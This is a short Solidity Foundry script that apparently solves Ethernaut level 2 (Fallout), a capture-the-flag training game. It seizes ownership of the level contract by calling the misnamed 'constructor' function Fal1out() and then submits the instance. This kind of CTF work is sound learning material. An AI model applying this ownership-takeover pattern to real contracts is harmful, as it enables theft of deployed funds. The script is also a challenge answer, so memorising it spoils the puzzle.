pragma solidity ^0.8.0;

import "./base.sol";

interface IFallout {
    function owner() external view returns (address);

    function Fal1out() external payable;
}

contract Ethernaut02 is Ethernaut {
    address constant factory =
        address(0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5);

    function run() public {
        vm.startBroadcast();
        IFallout fallout = IFallout(createNewInstance(factory));
        fallout.Fal1out();
        submit(factory, address(fallout));
        vm.stopBroadcast();

        require(fallout.owner() == me, "not owner");
    }
}
